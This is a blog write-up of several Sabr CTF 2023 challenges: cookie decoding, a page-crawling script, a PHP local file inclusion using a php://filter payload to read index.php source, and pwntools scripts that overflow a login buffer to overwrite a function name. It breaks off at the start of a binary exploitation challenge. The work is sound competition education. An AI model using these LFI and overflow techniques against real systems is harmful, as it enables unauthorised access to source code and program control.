---
layout: default
title : Sabr CTF 2023 Writeup
---

### CTF Overview

sabrCTF is an online 7-day Jeopardy Capture The Flag competition that mainly features challenges in the topics of reverse engineering and binary exploitation.

### Web Category 

### Seikooc: 
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/seikooc/1.png)

So on navigating to the web page I got this

We can see it just shows cookie and its more of a static page.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/seikooc/2.png)

Next thing I did was to check the source code maybe I will see anything of interest there but too bad nothing really is there only a word which is embedded in the `<img src>` tag which is “Find the flag!”

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/seikooc/3.png)

Now the challenge name has given us hint already seikooc == say cookie.

Lets check the cookie present in the web server using curl.
```
┌──(mark㉿haxor)-[~/…/CTF/Sabr/web/seikooc]
└─$ curl -v http://13.36.37.184:45250/ | head -n 1
*   Trying 13.36.37.184:45250...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 13.36.37.184 (13.36.37.184) port 45250 (#0)
> GET / HTTP/1.1
> Host: 13.36.37.184:45250
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 14 Jan 2023 00:59:43 GMT
< Server: Apache/2.4.54 (Debian)
< X-Powered-By: PHP/8.2.1
< Set-Cookie: flag=c2FicntjMDBrMTNzX3NoMHVsZF80bHc0eXNfYjNfY2gzY2tFZCEhIX0%3D; expires=Sat, 14 Jan 2023 01:59:43 GMT; Max-Age=3600
< Vary: Accept-Encoding
< Content-Length: 1282
< Content-Type: text/html; charset=UTF-8
< 
{ [1282 bytes data]
100  1282  100  1282    0     0   4174      0 --:--:-- --:--:-- --:--:--  4273
* Connection #0 to host 13.36.37.184 left intact
```

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/seikooc/4.png)

We can see there’s a cookie present and its encoded now lets decode the value using cyberchef.

But also if we notice the end of the flag cookie we see its url encoded

So here’s the decoding from cyberchef

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/seikooc/5.png)

Flag: sabr{c00k13s_sh0uld_4lw4ys_b3_ch3ckEd!!!}

### Tunnel Vision:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/1.png)

So on navigating to the web page we get two links to click.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/2.png)

Checking source code doesn’t really reveal anything. So lets check the links out.

On clicking the first link I got redirected to a page that shows `nope:)`

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/3.png)

So I checked the second link but instead this shows another page that has 2 links again

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/4.png)

So I kept on clicking and it kept on redirecting to a new page that has new links to click or it shows `nope`.

So obviously scripting your way out is the best thing to do. I read lots from stackoverflow questions and past ctfs to be able to generate this working exploit code written in python.

```
import requests
from bs4 import BeautifulSoup

# Starting URL
url = 'http://13.36.37.184:45260'

# Flag variable to indicate if the correct path is found
flag = False

# list of path values
paths = []

while True:
    # getting the page
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    print(f'Getting page from: {url}')
    
    # find the path on the page
    links = soup.find_all('a')
    paths = [link.get('href') for link in links if 'path=' in link.get('href')]
    
    # if no path found break the loop
    if not paths:
        print(f"The flag is: {response.text}")
        break
    print(f'Found {len(paths)} possible paths: {paths}')
    
    # iterate through all possible path values
    for path in paths:
        # Construct the URL with the current path value
        url = 'http://13.36.37.184:45260/' + path

        # Send a GET request to the URL
        response = requests.get(url)
        
        # If we hit a dead end, try the other path
        if "nope" in response.text:
            print("Sorry, you have reached a dead end. Please retry")
            paths.remove(path)
            url = 'http://13.36.37.184:45260' + paths[0]
            continue

        # Check the response for the flag
        if "sabr{" in response.text:
            print(f"The flag is: {response.text}")
            flag = True
            break
        else:
            print(f'Trying path: {path}...')
```

So basically what the script does is to loop the connection made to the web server then finds each path in the web source code which is then stored in the paths variable and also if no path if found then the code breaks.

So after that a for loop is called which will iterate the values stored in the path variable and perform a get request with the new path then it check if nope is in the response and if it is indeed there it removes the nope path and attempt to use another path.

Then the loop keeps on going till it finds `sabr{` in the response which is the flag format per se, after it does that it will then print out the content of the response.

Now lets run the code:
```
┌──(mark㉿haxor)-[~/…/CTF/Sabr/web/tunnel_vision]
└─$ python3 exploit.py                               
Getting page from: http://13.36.37.184:45260
Found 2 possible paths: ['/?path=z6qpcm5thexk', '/?path=41ebqfmu6onizs8']
Sorry, you have reached a dead end. Please retry
Getting page from: http://13.36.37.184:45260/?path=41ebqfmu6onizs8
Found 2 possible paths: ['/?path=b6aiup8z0g', '/?path=rd9quwhvp5n']
Sorry, you have reached a dead end. Please retry
Getting page from: http://13.36.37.184:45260/?path=rd9quwhvp5n
Found 2 possible paths: ['/?path=k54g6abnp9', '/?path=6r4gytkfsdxcj']
Sorry, you have reached a dead end. Please retry
Getting page from: http://13.36.37.184:45260/?path=6r4gytkfsdxcj
Found 2 possible paths: ['/?path=h61u7yjon0xabk', '/?path=nlu4voze3i']
Sorry, you have reached a dead end. Please retry
Getting page from: http://13.36.37.184:45260/?path=nlu4voze3i
Found 2 possible paths: ['/?path=14xr785t', '/?path=qpjb40863ifs']
[[-----------------------SNIP---------------------------------]]
Found 2 possible paths: ['/?path=05kezdfopaiyh', '/?path=uviswzk5qjl6h8g0']
Sorry, you have reached a dead end. Please retry
Getting page from: http://13.36.37.184:45260/?path=uviswzk5qjl6h8g0
Found 2 possible paths: ['/?path=156dfs3g0miv9h', '/?path=ncx7khzue1v5oysp']
The flag is: <strong>flag:</strong> <span>sabr{th3_r0b0t_sa1d:_8089}</span>
```

After few minutes of it generating get request with the valid paths I got the flag.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/tunnelvision/5.png)

Flag: sabr{th3_r0b0t_sa1d:_3e41}

### Wargamez:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/1.png)

On navigating to the web page I got this

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/2.png)

And immediately I noticed the url schema:

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/3.png)

We can clearly see that it is including the themes and its specifying the path where the dark theme is.

Now one way to take advantage of this vulnerability is by exploiting it via Local File Inclusion (LFI).

So I tried basic LFI Payloads but none worked and since the description of the challenge says that no fuzzing required I then decided to read the source code of the vulnerably php file (index.php) using php filters.

```
php://filter/read=convert.base64-encode/resource=index.php
```

So that will read the file then convert it to base64 cause if no conversion is done the web page will treat is as a php code which won’t show the source code.

At first we won’t see anything in here.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/4.png)

But on checking the source code we have a base64 encoded blob

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/5.png)

So I copied and saved the encoded blob on my machine to do the decoding.

```
┌──(mark㉿haxor)-[~/…/CTF/Sabr/web/wargamez]
└─$ nano encodedblob
                                                                                                        
┌──(mark㉿haxor)-[~/…/CTF/Sabr/web/wargamez]
└─$ cat encodedblob | base64 -d > index.php
                                                                                                        
┌──(mark㉿haxor)-[~/…/CTF/Sabr/web/wargamez]
└─$ 

```

Now on reading the source code we can clearly see the flag which is commented

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/web/wargamez/6.png)

Flag: sabr{w3lc0m3_t0_th3_w0rld_0f_w4rg4m3s}


### Miscellaneous Category 

### Sanity:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/sanity/1.png)

This just checks whether you are sane 😂

Flag: sabr{Welcome_To_Sabr_CTF}

### Simple machine:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/simplemachine/1.png)

We are given a remote service to connect to now lets check out what it does

```
┌──(mark㉿haxor)-[~/…/CTF/Sabr/misc/simplemachine]
└─$  nc 13.36.37.184 9099 

 ▄▄█████████ ▄███▄   ▄▄███ ▄▄████████▄ ▄▄████████▄ ▄███   ▄███ ▄█████████ ▄███   ▄███ ▄▄█████████
 ████▀▀▀▀▀▀▀ ██████▄██████ ████▀▀▀████ ████▀▀▀████ ████   ████ ▀▀▀████▀▀▀ █████▄ ████ ████▀▀▀▀▀▀▀
 ████▄▄▄▄▄▄  ████▀███▀████ ████▄▄▄████ ████   ▀▀▀▀ ████▄▄▄████    ████    ███████████ ████▄▄▄    
 ▀▀▀▀▀▀▀████ ████ ▀▀▀ ████ ████▀▀▀████ ████   ▄▄▄▄ ████▀▀▀████    ████    ████▀▀█████ ████▀▀▀    
 ▄▄▄▄▄▄▄████ ████     ████ ████   ████ ████▄▄▄████ ████   ████ ▄▄▄████▄▄▄ ████  ▀████ ████▄▄▄▄▄▄▄
 ██████████▀ ████     ████ ████   ████ ▀█████████▀ ████   ████ ██████████ ████   ████ ▀██████████
 ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀     ▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀
 Welcome to the Simple Machine. Type help or ? to list operations.


#> help

Documented commands (type help <topic>):
========================================
add  and  help  mul  or  regs  sub  win  xor

#> 

```

We are greeted with a banner and some sort of command line interface.

Using either ? or help we can view the commands that can be ran on this terminal.

Now the goal of this task is to set any register to 0x1337.

We can view the current state of all registers present using the regs comamnd

```
#> regs
x0 = 0x0000
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

And we see that its all set to 0.

From this now try using the help and see what each command does

```
#> help

Documented commands (type help <topic>):
========================================
add  and  help  mul  or  regs  sub  win  xor

#> 
```

This option (add) seems like the best to use right now.

Now next thing I did was to obviously try adding 0x1337 to any of the register which in this case i used register x0

```
#> add x0 0x1337
Invalid Syntax
#> 
```

But we see that we can’t really include 0 in as a value to add

So I tried adding 1337 to register x0 and checking the value using the regs command

```
#> add x0 1337
#> regs
x0 = 0x0a72
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

But weird when I checked the registers it showed another value.

So it took me some hours to figure out that the value we give it is converted from decimal to hex. Now this is interesting.

So next thing I did was to use the decimal representation of the hexadecimal value 0x1337 which is 4919

But i had to first subtract the initial value i put in the register using the sub command.

But on running it I got Bad Result as an output.

```
#> sub x0 1337
#> regs
x0 = 0x0000
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> add x0 4919
Bad Result.
#> 
```

Hmmm painful.. So next I tried add 4918 = 0x1336 to the register

```
#> add x0 4918
#> regs
x0 = 0x1336
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```
Well that worked we wrote 0x1336 to the register but we need to add 1 to make it 0x1337 but when i try adding 1 i.e add x0 1 I still got `Bad Result` as an error

So at this point I went to check other commands we can run

Now xor also adds value to the register we specify.

So next thing I did was to use it and add 1 to the register x0

```
#> help

Documented commands (type help <topic>):
========================================
add  and  help  mul  or  regs  sub  win  xor

#> xor x0 1
#> regs
x0 = 0x1337
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

Now that we have made the register the exact value lets call the win function

```
#> win
You Win, Flag is sabr{S1MPL3_STACK_M4CH1N3}
```

Now from what I noticed the xor command adds the exact value of what we want the register to be, so for confirming sake I decided to try it out

```
#> xor x0 4919
#> regs
x0 = 0x1337
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

Nice it also was able to add any number we specify to any register from here we can call win function

```
#> win
You Win, Flag is sabr{S1MPL3_STACK_M4CH1N3}
```

So here’s my python script to initialize the connection then do the evaluations and also call the win function

It might take few seconds to print the flag

```
#!/usr/bin/python2
from pwn import *
io = remote("13.36.37.184", 9099)

io.sendline("xor x1 4919")
io.sendline("regs")
io.send("win")
io.send("\n")
io.interactive()
io.close()
```

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/simplemachine/scriptresult.png)

Flag: sabr{S1MPL3_STACK_M4CH1N3}

### Complex machine:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/complexmachine/1.png)

So we’re given a remote service to connect to also lets check it out and note from the description is that we should call either win or flag function.

On connecting to it we see just like the previous simple machine cli but this time it has more commands that can be run.

```
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/misc/complexmachine]
└─$ nc 13.36.37.184 9092

 ▄▄████████▄ ▄███▄   ▄▄███ ▄▄████████▄ ▄▄████████▄ ▄███   ▄███ ▄█████████ ▄███   ▄███ ▄▄█████████
 ████▀▀▀████ ██████▄██████ ████▀▀▀████ ████▀▀▀████ ████   ████ ▀▀▀████▀▀▀ █████▄ ████ ████▀▀▀▀▀▀▀
 ████   ▀▀▀▀ ████▀███▀████ ████▄▄▄████ ████   ▀▀▀▀ ████▄▄▄████    ████    ███████████ ████▄▄▄    
 ████   ▄▄▄▄ ████ ▀▀▀ ████ ████▀▀▀████ ████   ▄▄▄▄ ████▀▀▀████    ████    ████▀▀█████ ████▀▀▀    
 ████▄▄▄████ ████     ████ ████   ████ ████▄▄▄████ ████   ████ ▄▄▄████▄▄▄ ████  ▀████ ████▄▄▄▄▄▄▄
 ▀█████████▀ ████     ████ ████   ████ ▀█████████▀ ████   ████ ██████████ ████   ████ ▀██████████
  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀     ▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀
                                                                                                 
 Welcome to the Complex Machine. Type help or ? to list operations.


#> help

Documented commands (type help <topic>):
========================================
add  call       help  login  mul  readstr  store  xor
and  functions  load  mem    or   regs     sub  

#> 
```

Now lets check the registers present using the regs command

```
#> regs
x0 = 0x0000
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

They are all set to zero but also we have a command called functions lets see what functions we have stored.

```

#> functions
Available Functions: 
        echo
        strreverse
        randstring
        strtohex
#> 
```

Cool we have the functions present.

We have other commands to check lets check out the mem command

```
#> mem
00000000: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000100: 65 63 68 6F 00 00 00 00  00 00 00 00 00 00 00 00  echo............
00000110: 73 74 72 72 65 76 65 72  73 65 00 00 00 00 00 00  strreverse......
00000120: 72 61 6E 64 73 74 72 69  6E 67 00 00 00 00 00 00  randstring......
00000130: 73 74 72 74 6F 68 65 78  00 00 00 00 00 00 00 00  strtohex........
00000140: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000150: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000160: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000170: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000180: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000190: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
#> 
```

From the result we can see that this is the memory address in which the functions are stored.

Lets check the command login and we need to pass an argument which is the password

```
#> login hacker
Invalid password: hacker !
#> login gimmeflag
Invalid password: gimmeflag !
#> 
```

Now lets check the memory address back

```
#> mem
00000000: 67 69 6D 6D 65 66 6C 61  67 00 00 00 00 00 00 00  gimmeflag.......
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000100: 65 63 68 6F 00 00 00 00  00 00 00 00 00 00 00 00  echo............
00000110: 73 74 72 72 65 76 65 72  73 65 00 00 00 00 00 00  strreverse......
00000120: 72 61 6E 64 73 74 72 69  6E 67 00 00 00 00 00 00  randstring......
00000130: 73 74 72 74 6F 68 65 78  00 00 00 00 00 00 00 00  strtohex........
00000140: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000150: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000160: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000170: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000180: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000190: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
#> 
```

We see that the login command argument we passed is been stored in the memory address

At this point what i then did was to overwrite any real function and replace with win.

How can this be achieved ?

Well by passing in junkdata +win

So I did that on my terminal to create a's' ("a"*256 + "win"), how i knew to use a*256 was by calculating the amount of bytes needed to reach the echo function in the memory address' 

```                                                                                                        
┌──(mark㉿haxor)-[~/…/CTF/Sabr/misc/complexmachine]
└─$ python2 -c 'print"a"*256+"win"'
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawin                                                                           
```

Now using that as the argument to login 

```
#> login aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawin
Invalid password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawin !
#> 
```

Now on checking the memory address we see that the echo function has been overwritten by win

```
#> mem
00000000: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000010: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000020: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000030: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000040: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000050: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000060: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000070: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000080: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000090: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000A0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000B0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000C0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000D0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000E0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
000000F0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
00000100: 77 69 6E 00 00 00 00 00  00 00 00 00 00 00 00 00  win.............
00000110: 73 74 72 72 65 76 65 72  73 65 00 00 00 00 00 00  strreverse......
00000120: 72 61 6E 64 73 74 72 69  6E 67 00 00 00 00 00 00  randstring......
00000130: 73 74 72 74 6F 68 65 78  00 00 00 00 00 00 00 00  strtohex........
00000140: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000150: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000160: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000170: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000180: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000190: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000001F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
#> 
```

We can confirm by checking the available functions using the function command

```
#> functions
Available Functions: 
        win
        strreverse
        randstring
        strtohex
#> 
```

Now lets try calling the win function 

And there’s a command that can call any function stored in the memory address `call`

```
#> call win
Invalid Argument!
#> 
```

But we get invalid argument. 

From this I remembered the previous machine required changing the value of any register to 0x1337 and calling the win command so i tried that here also

```
#> xor x0 4919
#> regs
x0 = 0x1337
x1 = 0x0000
x2 = 0x0000
x3 = 0x0000
x4 = 0x0000
x5 = 0x0000
x6 = 0x0000
x7 = 0x0000
x8 = 0x0000
x9 = 0x0000
#> 
```

Now lets call the win function again

```
#> call win
You Win, Flag is sabr{0x7563_is_TOO_Large_for_this_Machine}
```

And I got the flag.

Here’s my python script i used to solve it

It might take few seconds for it to print the flag

```
#/usr/bin/python2

from pwn import *
io = remote('13.36.37.184',9092)
bytes = 'a'*256

#sending the required param
io.sendline("xor x0 4919")

#over write the echo function
io.sendline("login "+bytes+"win")
io.sendline("regs")
io.sendline("call win")
io.send("\n")

#making the output interactive
io.interactive()
io.close()
```

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/complexmachine/scriptresult.png)

Flag: sabr{0x7563_is_TOO_Large_for_this_Machine}

### Binary Exploitation Category 

### 0v3reZ:
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/1.png)

We are given a binary and a remote service to connect to lets download the binary on our machine and analyze it

So at this point I did basic file check
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/2.png)
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/3.png)

We see its a 64 bit binary, dynamically linked and its stripped (meaning we won’t be able to see the functions name i.e main func)

We can also see that the binary has partial relro, it has no canary (so if we can perform a buffer overflow we won’t be stopped by stack protector), nx enabled (if we can inject shellcode to the stack we won't be able to execute it), no pie ( the address when the binary loads is static)

Please forgive me for not explaining those terms well as am not that good at binary exploitation yet

Now lets run this binary to get an overview of what is happening

```
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
└─$ ./0v3reZ

 ▄▄████████▄ ▄███   ▄███ ▄█████████▄ ▄█████████▄ ▄▄█████████ ▄██████████
 ████▀▀▀████ ████   ████ ▀▀▀▀▀▀▀████ ████▀▀▀████ ████▀▀▀▀▀▀▀ ▀▀▀▀▀▀█████
 ████   ████ ████   ████     ▄▄▄███▀ ████▄▄▄███▀ ████▄▄▄         ▄████▀▀
 ████   ████ ████  ▄████     ▀▀▀███▄ ████▀▀▀███▄ ████▀▀▀       ▄████▀▀  
 ████▄▄▄████ ████▄█████▀ ▄▄▄▄▄▄▄████ ████   ████ ████▄▄▄▄▄▄▄ ▄█████▄▄▄▄▄
 ▀█████████▀ ████████▀▀  ██████████▀ ████   ████ ▀██████████ ███████████
  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀


b0fz: hello
```

We see it just prints out a banner then takes in our input and exits

So i then de-compiled it using ghidra to analyze the functions in it
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/4.png)

